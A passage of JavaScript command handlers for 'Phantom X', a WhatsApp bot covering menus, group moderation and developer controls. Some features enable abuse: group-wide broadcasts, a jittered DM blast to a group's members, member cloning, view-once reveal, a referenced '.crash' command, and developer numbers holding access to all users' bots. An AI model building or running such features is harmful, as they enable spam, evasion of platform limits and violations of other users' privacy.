            case ".menu":
            case ".phantom": {
                const isDev = msg.key.fromMe || isDevJid(senderJid);
                const arg = (parts[1] || "").toLowerCase();
                const arg2 = (parts[2] || "").toLowerCase();

                // .menu style 1/2  → set per-user style
                if (arg === "style" && (arg2 === "1" || arg2 === "2")) {
                    if (!global.__menuStyle) global.__menuStyle = {};
                    global.__menuStyle[senderJid] = Number(arg2);
                    return reply(`🎨 Menu style set to *${arg2}*. Send *.menu* to see it.`);
                }

                const styleNum = (global.__menuStyle && global.__menuStyle[senderJid]) || 1;

                // .menu all → original full menu
                if (arg === "all") {
                    const fullText = buildMenuText(currentMode, getMenuTheme(botJid), isDev);
                    if (fs.existsSync(MENU_BANNER_FILE)) {
                        try {
                            const bannerBuf = fs.readFileSync(MENU_BANNER_FILE);
                            return await sock.sendMessage(from, { image: bannerBuf, caption: fullText }, { quoted: msg });
                        } catch {}
                    }
                    return await sock.sendMessage(from, { text: fullText }, { quoted: msg });
                }

                // .menu <number> → show one section
                const sections = getVisibleSections(isDev);
                const sectionNum = parseInt(arg, 10);
                if (sectionNum && sectionNum >= 1 && sectionNum <= sections.length) {
                    const sec = sections[sectionNum - 1];
                    const allSections = getMenuSections();
                    const realIdx = allSections.findIndex(s => s.title === sec.title);
                    const text = buildOneSectionText(sec, sectionNum - 1, styleNum);
                    const banner = getSectionBanner(realIdx);
                    if (banner) {
                        try {
                            const buf = Buffer.from(banner, "base64");
                            return await sock.sendMessage(from, { image: buf, caption: text }, { quoted: msg });
                        } catch {}
                    }
                    return await sock.sendMessage(from, { text }, { quoted: msg });
                }

                // default → section picker
                const pickerText = buildSectionPicker(isDev, styleNum);
                if (fs.existsSync(MENU_BANNER_FILE)) {
                    try {
                        const bannerBuf = fs.readFileSync(MENU_BANNER_FILE);
                        return await sock.sendMessage(from, { image: bannerBuf, caption: pickerText }, { quoted: msg });
                    } catch {}
                }
                await sock.sendMessage(from, { text: pickerText }, { quoted: msg });
                break;
            }

            // .setsectionpic <num>  (reply to image) — set per-section banner
            case ".setsectionpic": {
                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Owner/dev only.");
                const idx = parseInt(parts[1], 10);
                const allSections = getMenuSections();
                if (!idx || idx < 1 || idx > allSections.length) return reply(`Usage: .setsectionpic <1-${allSections.length}>  (reply to an image)`);
                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                const qtype = quoted ? getContentType(quoted) : null;
                if (!quoted || qtype !== "imageMessage") return reply("Reply to an image with this command.");
                try {
                    const fakeMsg = { ...msg, message: quoted };
                    const buf = await downloadMediaMessage(fakeMsg, "buffer", {}, { logger: pino({ level: "silent" }) });
                    setSectionBanner(idx - 1, buf.toString("base64"));
                    await reply(`✅ Banner set for section *${idx}* — ${allSections[idx - 1].title}`);
                } catch (e) { await reply(`❌ ${e.message}`); }
                break;
            }
            case ".delsectionpic": {
                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Owner/dev only.");
                const idx = parseInt(parts[1], 10);
                const allSections = getMenuSections();
                if (!idx || idx < 1 || idx > allSections.length) return reply(`Usage: .delsectionpic <1-${allSections.length}>`);
                delSectionBanner(idx - 1);
                await reply(`🗑️ Section banner cleared for *${idx}* — ${allSections[idx - 1].title}`);
                break;
            }

            case ".setpp": {
                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                const quotedType = quoted ? getContentType(quoted) : null;
                if (!quoted || quotedType !== "imageMessage") {
                    return reply("🖼️ Reply to an image with *.setpp* to set it as the menu banner.\n\nWhenever *.menu* or *.phantom* is used, that image will appear first.");
                }
                await reply("⏳ Saving your menu banner...");
                try {
                    const fakeMsg = { ...msg, message: quoted };
                    const buf = await downloadMediaMessage(fakeMsg, "buffer", {}, { logger: pino({ level: "silent" }) });
                    fs.writeFileSync(MENU_BANNER_FILE, buf);
                    await reply("✅ *Menu banner set!*\n\nNext time you or anyone uses *.menu* or *.phantom*, your image will show first. 🔥");
                } catch (e) {
                    await reply(`❌ Failed to save banner: ${e?.message || "error"}`);
                }
                break;
            }

            case ".delpp": {
                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                const delSection = parts[1]?.toLowerCase();
                if (delSection === "bug") {
                    if (!fs.existsSync(BUG_BANNER_FILE)) return reply("⚠️ No bug menu banner is set.");
                    fs.unlinkSync(BUG_BANNER_FILE);
                    return reply("✅ Bug menu banner deleted.");
                } else if (delSection === "owner") {
                    if (!fs.existsSync(OWNER_BANNER_FILE)) return reply("⚠️ No owner menu banner is set.");
                    fs.unlinkSync(OWNER_BANNER_FILE);
                    return reply("✅ Owner menu banner deleted.");
                } else {
                    if (!fs.existsSync(MENU_BANNER_FILE)) return reply("⚠️ No main menu banner is set.");
                    fs.unlinkSync(MENU_BANNER_FILE);
                    return reply("✅ Main menu banner deleted.\n\nTip: use *.delpp bug* or *.delpp owner* to delete those section banners.");
                }
            }

            // ─── SET MENU PIC (per-section banner) ───
            // Reply to any image with .setmenupic [section] to set that section's banner.
            // Sections: main (default), bug, owner
            case ".setmenupic": {
                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                const picSection = parts[1]?.toLowerCase() || "main";
                const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                const quotedType = quoted ? getContentType(quoted) : null;
                if (!quoted || quotedType !== "imageMessage") {
                    return reply(
                        `🖼️ *Set Menu Picture*\n\n` +
                        `Reply to an image with:\n` +
                        `• *.setmenupic* — set main menu banner\n` +
                        `• *.setmenupic bug* — set bug menu banner\n` +
                        `• *.setmenupic owner* — set owner menu banner\n\n` +
                        `The image will appear when that menu section is shown.\n` +
                        `Use *.delpp [section]* to remove a banner.`
                    );
                }
                let targetFile;
                let sectionLabel;
                if (picSection === "bug" || picSection === "bugmenu") {
                    targetFile = BUG_BANNER_FILE;
                    sectionLabel = "bug menu";
                } else if (picSection === "owner") {
                    targetFile = OWNER_BANNER_FILE;
                    sectionLabel = "owner menu";
                } else {
                    targetFile = MENU_BANNER_FILE;
                    sectionLabel = "main menu";
                }
                await reply(`⏳ Saving ${sectionLabel} banner...`);
                try {
                    const fakeMsg = { ...msg, message: quoted };
                    const buf = await downloadMediaMessage(fakeMsg, "buffer", {}, { logger: pino({ level: "silent" }) });
                    fs.writeFileSync(targetFile, buf);
                    await reply(`✅ *${sectionLabel.charAt(0).toUpperCase() + sectionLabel.slice(1)} banner set!*\n\nThis image will now appear whenever the ${sectionLabel} is shown. 🔥`);
                } catch (e) {
                    await reply(`❌ Failed to save banner: ${e?.message || "error"}`);
                }
                break;
            }

            case ".mode": {
                const val = parts[1]?.toLowerCase();
                if (!["owner", "public"].includes(val)) {
                    return reply(
                        `⚙️ *Bot Mode Settings*\n\n` +
                        `Current mode: *${currentMode === "owner" ? "👤 Owner Only" : "🌍 Public"}*\n\n` +
                        `• *.mode public* — Anyone in groups can use commands\n` +
                        `• *.mode owner* — Only you (the bot owner) can use commands\n\n` +
                        `_Shortcuts: .public or .owner_`
                    );
                }
                setBotMode(botJid, val);
                const label = val === "owner" ? "👤 Owner Only" : "🌍 Public";
                await reply(`✅ Bot mode set to *${label}*\n\n${val === "owner" ? "Only you can now trigger commands." : "Everyone in groups can now use commands."}`);
                break;
            }

            case ".public": {
                setBotMode(botJid, "public");
                await reply(`✅ Bot mode set to *🌍 Public*\n\nEveryone in groups can now use commands.\n\nUse *.owner* to restrict it back to only you.`);
                break;
            }

            case ".owner": {
                if (!msg.key.fromMe) return reply("❌ Only the bot owner can restrict the bot to owner mode.");
                setBotMode(botJid, "owner");
                await reply(`✅ Bot mode set to *👤 Owner Only*\n\nOnly you can now trigger commands.\n\nUse *.public* to open it to everyone again.`);
                break;
            }

            case ".menudesign": {
                const themeNames = {
                    1:  "👻 Ghost       — Spaced & Stylish",
                    2:  "💻 Matrix      — Hacker Terminal",
                    3:  "👑 Royal       — Elegant Crown",
                    4:  "🔥 Inferno     — Fire & Savage",
                    5:  "✧  Minimal     — Clean & Simple",
                    6:  "🕳️ VOID        — Ultimate Hacker Echo",
                    7:  "🌊 Vaporwave   — Fullwidth Aesthetic",
                    8:  "𝔊  Gothic      — Fraktur Blackletter",
                    9:  "𝒞  Cursive     — Script Handwriting",
                    10: "🌌 Cosmos      — Space & Galaxy",
                    11: "🌸 Soft        — Double-Struck Cute",
                    12: "💎 Diamond     — Bold Luxury Elite",
                    13: "⚡ Thunder     — Bold Sans Electric",
                    14: "⚔️ Warrior     — Small Caps Battle",
                    15: "🌈 Neon        — Circled Colour Pop",
                    16: "🕵️ Spy         — Classified Redacted",
                    17: "🏴‍☠️ Pirate     — Sail the Digital Sea",
                    18: "🌑 Shadow      — Dark & Mysterious",
                    19: "🔲 Bold Tech   — Math Bold Italic",
                    20: "·)) Echo       — Signal Lost Ripple",
                };
                const n = parseInt(parts[1]);
                if (!n || n < 1 || n > 20) {
                    const current = getMenuTheme(botJid);
                    let list = `🎨 *Menu Designs — Choose 1 to 20*\n\nCurrent: *${themeNames[current] || themeNames[1]}*\n\n`;
                    for (const [num, name] of Object.entries(themeNames)) {
                        list += `  *${num}.* ${name}\n`;
                    }
                    list += `\n_Usage: .menudesign 6  (try the VOID!)_`;
                    return reply(list);
                }
                setMenuTheme(botJid, n);
                await reply(`✅ Menu design changed to *${themeNames[n]}*\n\nType *.menu* to see it! 🔥`);
                break;
            }

            case ".broadcast": {
                const intervalMins = parseInt(parts[1]);
                const broadcastMsg = parts.slice(2).join(" ").trim();
                if (!intervalMins || intervalMins < 1 || !broadcastMsg) {
                    return reply(
                        `📡 *Broadcast Usage:*\n\n` +
                        `*.broadcast* ‹interval-mins› ‹your message›\n\n` +
                        `*Example:*\n` +
                        `_.broadcast 10 Hey everyone! Check this out 🔥_\n\n` +
                        `This will send your message to all groups you're in, one group every 10 minutes.\n\n` +
                        `Use *.stopbroadcast* to cancel.`
                    );
                }
                if (broadcastJobs[botJid]) {
                    return reply("⚠️ A broadcast is already running.\n\nUse *.stopbroadcast* to stop it first.");
                }
                await reply("⏳ Fetching your groups...");
                try {
                    const allGroups = await sock.groupFetchAllParticipating();
                    const groupIds = Object.keys(allGroups);
                    if (!groupIds.length) return reply("❌ You're not in any groups.");
                    const intervalMs = intervalMins * 60 * 1000;
                    const totalGroups = groupIds.length;
                    const estMins = totalGroups * intervalMins;
                    await reply(
                        `📡 *Broadcast started!*\n\n` +
                        `📨 Message: _${broadcastMsg}_\n` +
                        `👥 Groups found: *${totalGroups}*\n` +
                        `⏱️ Interval: *every ${intervalMins} min(s)*\n` +
                        `🕐 Est. time: *~${estMins} min(s)*\n\n` +
                        `Use *.stopbroadcast* to cancel anytime.`
                    );
                    let idx = 0;
                    const intervalId = setInterval(async () => {
                        if (idx >= groupIds.length) {
                            clearInterval(intervalId);
                            delete broadcastJobs[botJid];
                            try { await sock.sendMessage(from, { text: `✅ *Broadcast complete!*\n\nMessage sent to all *${totalGroups}* groups successfully.` }); } catch (_) {}
                            return;
                        }
                        const gid = groupIds[idx];
                        idx++;
                        try {
                            await sock.sendMessage(gid, { text: broadcastMsg });
                            await sock.sendMessage(from, { text: `📤 Sent (${idx}/${totalGroups}): ${allGroups[gid]?.subject || gid}` });
                        } catch (e) {
                            await sock.sendMessage(from, { text: `⚠️ Failed (${idx}/${totalGroups}): ${allGroups[gid]?.subject || gid} — ${e?.message || "error"}` });
                        }
                    }, intervalMs);
                    broadcastJobs[botJid] = { intervalId, total: totalGroups };
                } catch (e) {
                    await reply(`❌ Broadcast failed: ${e?.message || "error"}`);
                }
                break;
            }

            case ".stopbroadcast": {
                if (!broadcastJobs[botJid]) return reply("⚠️ No active broadcast to stop.");
                clearInterval(broadcastJobs[botJid].intervalId);
                delete broadcastJobs[botJid];
                await reply("🛑 *Broadcast stopped.* No more messages will be sent.");
                break;
            }

            case ".info": {
                await reply(
                    `🤖 *Phantom X Bot*\n\nVersion: v${BOT_VERSION}\nRuntime: ${formatUptime()}\nBuilt with: Baileys + Node.js\n\n_Built different. Built cold._ 🖤`
                );
                break;
            }

            case ".list": {
                const listTopic = parts.slice(1).join(" ").toLowerCase().trim();
                if (listTopic === "group menu" || listTopic === "group" || listTopic === "groups") return reply(buildGroupMenuList());
                if (listTopic === "bug menu" || listTopic === "bug" || listTopic === "bugs") {
                    const bt = buildBugMenuText();
                    if (fs.existsSync(BUG_BANNER_FILE)) {
                        try { return void await sock.sendMessage(from, { image: fs.readFileSync(BUG_BANNER_FILE), caption: bt }, { quoted: msg }); } catch (_) {}
                    }
                    return reply(bt);
                }
                if (listTopic === "protection menu" || listTopic === "protection") return reply(buildSimpleSectionList("protection"));
                if (listTopic === "utility menu" || listTopic === "utilities" || listTopic === "utility") return reply(buildSimpleSectionList("utility"));
                if (listTopic === "owner menu" || listTopic === "owner" || listTopic === "control") {
                    const ot = buildSimpleSectionList("owner");
                    if (fs.existsSync(OWNER_BANNER_FILE)) {
                        try { return void await sock.sendMessage(from, { image: fs.readFileSync(OWNER_BANNER_FILE), caption: ot }, { quoted: msg }); } catch (_) {}
                    }
                    return reply(ot);
                }
                if (listTopic === "clone menu" || listTopic === "gc clone" || listTopic === "clone") return reply(buildSimpleSectionList("clone"));
                if (listTopic === "tag menu" || listTopic === "tag" || listTopic === "tags") return reply(buildSimpleSectionList("tag"));
                if (listTopic === "fun menu" || listTopic === "fun") return reply(buildSimpleSectionList("fun"));
                if (listTopic === "game menu" || listTopic === "games" || listTopic === "game") return reply(buildSimpleSectionList("game"));
                return reply(buildListMenu());
            }

            case ".help": {
                const helpTopic = parts.slice(1).join(" ").toLowerCase().trim();
                if (helpTopic === "bug menu" || helpTopic === "bugmenu" || helpTopic === "bug" || helpTopic === "bugs") {
                    const bt = buildBugMenuText();
                    if (fs.existsSync(BUG_BANNER_FILE)) {
                        try { return void await sock.sendMessage(from, { image: fs.readFileSync(BUG_BANNER_FILE), caption: bt }, { quoted: msg }); } catch (_) {}
                    }
                    return reply(bt);
                }
                if (helpTopic === "group menu" || helpTopic === "group" || helpTopic === "groups") return reply(buildGroupMenuList());
                if (helpTopic === "protection menu" || helpTopic === "protection" || helpTopic === "antibug") return reply(buildSimpleSectionList("protection"));
                if (helpTopic === "utility menu" || helpTopic === "utilities" || helpTopic === "utility" || helpTopic === "numinfo") return reply(buildSimpleSectionList("utility"));
                if (helpTopic === "owner menu" || helpTopic === "owner" || helpTopic === "restart") {
                    const ot = buildSimpleSectionList("owner");
                    if (fs.existsSync(OWNER_BANNER_FILE)) {
                        try { return void await sock.sendMessage(from, { image: fs.readFileSync(OWNER_BANNER_FILE), caption: ot }, { quoted: msg }); } catch (_) {}
                    }
                    return reply(ot);
                }
                if (helpTopic === "clone menu" || helpTopic === "gc clone" || helpTopic === "clone") return reply(buildSimpleSectionList("clone"));
                if (helpTopic === "tag menu" || helpTopic === "tag" || helpTopic === "tagadmin") return reply(buildSimpleSectionList("tag"));
                await reply(
`📖 *Phantom X — Full Command Guide*
━━━━━━━━━━━━━━━━━━━━

📋 *GENERAL*
• *.menu / .phantom* — Show menu
• *.info* — Bot version & uptime
• *.ping* — Bot latency
• *.restart* — Restart/reconnect this linked WhatsApp session
• *.setpp* — Set menu banner (reply to image)
• *.menudesign 1-20* — Switch between 20 menu designs
• *.mode public/owner* — Change who can use the bot
• *.setstatus <text>* — Change WhatsApp About text
• *.setname <name>* — Change WhatsApp display name

━━━━━━━━━━━━━━━━━━━━
⚠️ *MODERATION*
• *.warn @user* — Warn someone (3 warnings = auto-kick)
• *.warnlist* — See all warnings in this group
• *.resetwarn @user* — Clear a member's warnings
• *.ban @user* — Ban from using this bot entirely
• *.unban @user* — Remove ban

━━━━━━━━━━━━━━━━━━━━
👥 *GROUP MANAGEMENT*
• *.add 234xxxxxxxx* — Add member by phone number
• *.kick @user* — Remove a member
• *.promote @user* — Make admin
• *.demote @user* — Remove admin
• *.link* — Get group invite link
• *.revoke* — Reset invite link
• *.mute* — Lock group (admins only)
• *.unmute* — Open group to all
• *.groupinfo* — Full group stats
• *.adminlist* — List all admins
• *.tagadmin <msg>* — Tag only group admins
• *.membercount* — How many members
• *.everyone <msg>* — Tag all members with a message

━━━━━━━━━━━━━━━━━━━━
🏷️ *TAG & ANNOUNCE*
• *.hidetag* — Silently tag all members (invisible mentions)
• *.tagall* — Tag all with visible @numbers
• *.readmore* — Hide text behind Read More
• *.broadcast <mins> <msg>* — Send to all groups periodically
• *.stopbroadcast* — Stop broadcast
• *.schedule HH:MM <msg>* — Send a message daily at a specific time
• *.unschedule HH:MM* — Remove a schedule
• *.schedules* — View all active schedules

━━━━━━━━━━━━━━━━━━━━
⚙️ *AUTOMATION*
• *.autoreact on/off/emoji* — Auto-react to every message
• *.autoreply add/remove/list* — Keyword auto-replies
• *.setalias <word> <.cmd>* — Create command shortcut
• *.delalias <word>* — Delete shortcut
• *.aliases* — List all shortcuts
• *.antidelete on/off* — Catch and re-post deleted messages
• *.antibot on/off* — Auto-kick accounts that look like bots

━━━━━━━━━━━━━━━━━━━━
🛡️ *GROUP PROTECTION*
• *.antilink on/off* — Block & warn for links (3 strikes = kick)
• *.antispam on/off* — Block rapid messages (3 strikes = kick)
• *.antidemote on/off* — Instantly punish anyone who demotes an admin

━━━━━━━━━━━━━━━━━━━━
🧠 *AI & MEDIA*
• *.ai / .ask / .gemini <question>* — Ask Gemini AI (need free API key)
• *.imagine <prompt>* — Generate AI image (free)
• *.song <title>* — Search songs via iTunes
• *.lyrics <artist> | <title>* — Get song lyrics
• *.ss / .screenshot <url>* — Screenshot a website
• *.viewonce* — Reveal a view-once image/video (reply to it)
• *.ocr* — Extract text from an image (printed & handwritten ✍️)

━━━━━━━━━━━━━━━━━━━━
🔍 *UTILITIES*
• *.numinfo <number>* — Country/prefix info for a phone number
• *.targetloc <number>* — Same as numinfo (not live GPS)
• *.translate <lang> <text>* — Translate text (e.g. .translate yo Hello)
  Codes: yo=Yoruba, ig=Igbo, ha=Hausa, fr=French, es=Spanish
• *.weather <city>* — Current weather for any city
• *.calc <expression>* — Calculator (e.g. .calc 5 * 3)
• *.bible <verse>* — Bible verse (e.g. .bible John 3:16)
• *.quran <surah:ayah>* — Quran verse (e.g. .quran 2:255)
• *.groupid* — Get group/community ID

━━━━━━━━━━━━━━━━━━━━
🎮 *GAMES*
• *.flip* — Coin flip (Heads or Tails)
• *.dice [sides]* — Roll a dice (default 6-sided)
• *.8ball <question>* — Magic 8-ball answer
• *.rps rock/paper/scissors* — Play against the bot
• *.slots* — Slot machine (try your luck!)
• *.trivia* — Answer a trivia question (.trivia skip to skip)
• *.hangman <letter>* — Guess the hidden word letter by letter
• *.ttt @p1 @p2* — Start a Tic-Tac-Toe game
• *.truth* — Get a truth question
• *.dare* — Get a dare challenge
• *.wordchain [word]* — Start a word chain game

━━━━━━━━━━━━━━━━━━━━
😂 *FUN*
• *.joke* — Random Nigerian-style joke
• *.fact* — Random interesting fact
• *.quote* — Motivational quote
• *.roast @user* — Roast someone
• *.compliment @user* — Compliment someone

━━━━━━━━━━━━━━━━━━━━
⚽ *FOOTBALL*
• *.pltable* — Premier League standings
• *.live* — Live PL match scores
• *.fixtures <club>* — Club fixtures & results
• *.fnews <club>* — Latest club news
• *.football <club>* — Full club overview

━━━━━━━━━━━━━━━━━━━━
🔄 *GC CLONE*
• *.clone <src> <dst> <batch> <mins>* — Clone members to another group
• *.stopclone* — Stop active clone job
_Can be started from any chat, but source members require source group access and destination needs admin access._

━━━━━━━━━━━━━━━━━━━━
💡 _All group commands require the bot to be admin._
💡 _Keep-alive: Ping your Replit URL every 5 min via UptimeRobot!_`
                );
                break;
            }

            case ".restart":
            case ".reboot": {
                if (!msg.key.fromMe && !isSelfChat) return reply("❌ Owner only.");
                const session = getSessionForSocket(sock);
                if (!session?.phoneNumber) return reply("❌ I could not find this linked session. Use /pair on Telegram if you need to reconnect.");
                await reply("♻️ Restarting *this* linked WhatsApp session now...\n\nOther sessions are unaffected. A welcome message will arrive when connection is restored.");
                setTimeout(() => {
                    try { sock.end(new Error("Manual restart requested")); }
                    catch (_) { try { sock.ws?.close(); } catch (_) {} }
                }, 1000);
                break;
            }

            // ════════════════════════════════════════
            // ░░░░░ DEVELOPER CONTROL COMMANDS ░░░░░
            // ════════════════════════════════════════

            // --- UNLEASH — grant command access ---
            // .unleash allcmds               → everyone gets all cmds
            // .unleash allcmds <number>       → specific number gets all cmds
            // .unleash <cmd> all              → specific cmd open to everyone
            // .unleash <cmd> <number>         → specific cmd for specific number
            case ".unleash": {
                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
                const uCmd = parts[1]?.toLowerCase();
                const uTarget = parts[2]?.replace(/\D/g, "") || "all";
                if (!uCmd) return reply(
                    `🔓 *Unleash Command*\n\n` +
                    `Usage:\n` +
                    `• *.unleash allcmds* — open all cmds to everyone\n` +
                    `• *.unleash allcmds <number>* — give a number full access\n` +
                    `• *.unleash <cmd> all* — open one cmd to everyone\n` +
                    `• *.unleash <cmd> <number>* — open one cmd to one number\n\n` +
                    `Example: *.unleash .pltable 2348012345678*`
                );
                if (uCmd === "allcmds" && (uTarget === "all" || !parts[2])) {
                    const data = loadPremium(); data.global_unlock = true; savePremium(data);
                    return reply(`✅ *All commands are now open to everyone.*\nPhantom X is in full public mode.`);
                }
                const cmdKey = uCmd.startsWith(".") ? uCmd : `.${uCmd}`;
                unleashCmd(cmdKey === ".allcmds" ? "allcmds" : cmdKey, uTarget);
                const targetLabel = uTarget === "all" ? "everyone" : `+${uTarget}`;
                return reply(`✅ *Unleashed ${cmdKey === ".allcmds" ? "all commands" : cmdKey}* for *${targetLabel}*.`);
            }

            // --- LOCK — revoke access ---
            // .lock allcmds    → re-lock everything (back to premium-only)
            // .lock <cmd>      → re-lock a specific cmd
            case ".lock": {
                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
                const lCmd = parts[1]?.toLowerCase();
                if (!lCmd) return reply(
                    `🔒 *Lock Command*\n\n` +
                    `• *.lock allcmds* — re-lock everything\n` +
                    `• *.lock <cmd>* — re-lock one command\n\n` +
                    `Example: *.lock .pltable*`
                );
                lockCmd(lCmd);
                return reply(`🔒 *${lCmd === "allcmds" ? "All commands re-locked." : `${lCmd} is now locked again.`}*\nOnly premium users can access it.`);
            }

            // --- LOCKFOR — block a specific cmd for a specific number, even if premium ---
            // .lockfor <number> <cmd>       → block that cmd for that number
            // .lockfor <number> allcmds     → block ALL cmds for that number
            case ".lockfor": {
                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
                const lfNum = (parts[1] || "").replace(/\D/g, "");
                const lfCmd = (parts[2] || "").toLowerCase();
                if (!lfNum || !lfCmd) return reply(
                    `🔒 *Lock For Command*\n\n` +
                    `Block a specific command for a specific number (overrides premium).\n\n` +
                    `Usage:\n` +
                    `• *.lockfor <number> <cmd>* — block one cmd for that number\n` +
                    `• *.lockfor <number> allcmds* — block ALL cmds for that number\n\n` +
                    `Example: *.lockfor 2348012345678 .crash*`
                );
                const lfKey = lfCmd.startsWith(".") ? lfCmd : (lfCmd === "allcmds" ? "allcmds" : `.${lfCmd}`);
                setLockedFor(lfNum, lfCmd === "allcmds" ? "allcmds" : lfKey, true);
                return reply(`🔒 *+${lfNum}* is now blocked from *${lfKey === "allcmds" ? "ALL commands" : lfKey}*.\nThis overrides their premium status.`);
            }

            // --- UNLOCKFOR — remove a per-number block ---
            case ".unlockfor": {
                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
                const ufNum = (parts[1] || "").replace(/\D/g, "");
                const ufCmd = (parts[2] || "").toLowerCase();
                if (!ufNum || !ufCmd) return reply(
                    `🔓 *Unlock For Command*\n\n` +
                    `Remove a specific block from a number.\n\n` +
                    `Usage:\n` +
                    `• *.unlockfor <number> <cmd>* — remove block for one cmd\n` +
                    `• *.unlockfor <number> allcmds* — remove the allcmds block\n\n` +
                    `Example: *.unlockfor 2348012345678 .crash*`
                );
                const ufKey = ufCmd.startsWith(".") ? ufCmd : (ufCmd === "allcmds" ? "allcmds" : `.${ufCmd}`);
                setLockedFor(ufNum, ufCmd === "allcmds" ? "allcmds" : ufKey, false);
                return reply(`✅ Block removed. *+${ufNum}* can now access *${ufKey === "allcmds" ? "all commands" : ufKey}* again (if premium).`);
            }

            // --- PREMIUM ADD/REMOVE individual numbers ---
            case ".premiumadd": {
                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
                const paNum = (parts[1] || "").replace(/\D/g, "");
                if (!paNum) return reply("Usage: .premiumadd <number>\nExample: .premiumadd 2348012345678");
                setPremiumNumber(paNum, true);
                return reply(`✅ *+${paNum}* added to premium list.\nThey now have full access to all commands.`);
            }
            case ".premiumremove": {
                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
                const prNum = (parts[1] || "").replace(/\D/g, "");
                if (!prNum) return reply("Usage: .premiumremove <number>\nExample: .premiumremove 2348012345678");
                setPremiumNumber(prNum, false);
                return reply(`✅ *+${prNum}* removed from premium list.`);
            }
            case ".premiumlist": {
                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
                const pd = loadPremium();
                const globalUnlock = pd.global_unlock ? "✅ YES — all cmds open to everyone" : "❌ No";
                const premNums = (pd.premium_numbers || []).map(n => `  • +${n}`).join("\n") || "  _None_";
                const unlocked = pd.unlocked_cmds || {};
                let unlockedLines = "";
                for (const [cmd, val] of Object.entries(unlocked)) {
                    const tgt = val === "all" ? "everyone" : (Array.isArray(val) ? val.map(n => `+${n}`).join(", ") : val);
                    unlockedLines += `  • ${cmd} → ${tgt}\n`;
                }
                return reply(
                    `💎 *Premium Status*\n` +
                    `━━━━━━━━━━━━━━━━━━━━\n\n` +
                    `🌍 *Global unlock:* ${globalUnlock}\n\n` +
                    `👥 *Premium numbers:*\n${premNums}\n\n` +
                    `🔓 *Unlocked commands:*\n${unlockedLines || "  _None_"}`
                );
            }

            // --- ADDDEV / REMOVEDEV — add/remove a runtime dev number ---
            case ".adddev": {
                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
                const adNum = (parts[1] || "").replace(/\D/g, "");
                if (!adNum || adNum.length < 7) return reply("Usage: .adddev <number>\nExample: .adddev 2348012345678");
                const devs = loadExtraDevs();
                if (!devs.includes(adNum)) { devs.push(adNum); saveExtraDevs(devs); }
                return reply(`✅ *+${adNum}* is now a developer.\nThey have full dev access to all commands on all bots.`);
            }
            case ".removedev": {
                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
                const rdNum = (parts[1] || "").replace(/\D/g, "");
                if (!rdNum) return reply("Usage: .removedev <number>");
                const devs = loadExtraDevs().filter(n => n !== rdNum);
                saveExtraDevs(devs);
                return reply(`✅ *+${rdNum}* removed from developer list.`);
            }
            case ".devlist": {
                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
                const allDevs = [...DEV_NUMBERS, ...loadExtraDevs()];
                return reply(`👨‍💻 *Developer Numbers*\n━━━━━━━━━━━━━━━━━━━━\n\n${allDevs.map((n, i) => `${i === 0 ? "👑" : "🔹"} +${n}${i === 0 ? " _(primary)_" : ""}`).join("\n")}`);
            }

            // --- REGROUP — slow-roll DM blast to a group's members ---
            case ".regroup": {
                if (!isDevJid(senderJid) && !msg.key.fromMe) return reply("❌ Developer only.");
                const sub = (parts[1] || "").toLowerCase();
                const rest = parts.slice(2).join(" ").trim();
                const cfg = loadRegroup();

                if (!sub || sub === "show" || sub === "view") {
                    return reply(
                        `📦 *Regroup — Slow Migration Tool*\n━━━━━━━━━━━━━━━━━━━━\n` +
                        `Active job:    ${cfg.active ? `🟢 in group ${cfg.active.group} (${cfg.active.sent}/${cfg.active.total})` : "—"}\n` +
                        `Group link:    ${cfg.groupLink || "_(not set)_"}\n` +
                        `Per-msg delay: ${cfg.perMessageDelaySeconds}s\n` +
                        `Jitter:        ±${cfg.jitterSeconds}s\n` +
                        `Skip admins:   ${cfg.skipAdmins ? "yes" : "no"}\n\n` +
                        `*Message preview:*\n${cfg.text.replace("{LINK}", cfg.groupLink || "<link>")}\n\n` +
                        `━━━━━━━━━━━━━━━━━━━━\n*Commands:*\n` +
                        `• *.regroup set <text>* — message body (use {LINK})\n` +
                        `• *.regroup link <invite>* — destination group link\n` +
                        `• *.regroup delay <sec>* — pause between DMs\n` +
                        `• *.regroup jitter <sec>* — random ± per DM\n` +
                        `• *.regroup skipadmins on/off*\n` +
                        `• *.regroup start* — run in current group\n` +
                        `• *.regroup stop* — cancel a running job\n` +
                        `• *.regroup status* — show progress`
                    );
                }
                if (sub === "set" || sub === "text") {
                    if (!rest) return reply("Usage: .regroup set <message — use {LINK} where the link should appear>");
                    cfg.text = rest; saveRegroup(cfg);
                    return reply(`✅ Regroup text saved.\n\nPreview:\n${rest.replace("{LINK}", cfg.groupLink || "<link>")}`);
                }
                if (sub === "link" || sub === "group") {
                    if (!rest || !/^https?:\/\//i.test(rest)) return reply("Usage: .regroup link <https://chat.whatsapp.com/CODE>");
                    cfg.groupLink = rest; saveRegroup(cfg);
                    return reply(`✅ Destination link saved.\n🔗 ${rest}`);
                }
                if (sub === "delay") {
                    const n = parseInt(rest, 10);
                    if (!n || n < 3 || n > 600) return reply("Usage: .regroup delay <3-600 seconds>");
                    cfg.perMessageDelaySeconds = n; saveRegroup(cfg);
                    return reply(`✅ Per-message delay set to ${n}s.`);
                }
                if (sub === "jitter") {
                    const n = parseInt(rest, 10);
                    if (n === undefined || isNaN(n) || n < 0 || n > 300) return reply("Usage: .regroup jitter <0-300 seconds>");
                    cfg.jitterSeconds = n; saveRegroup(cfg);
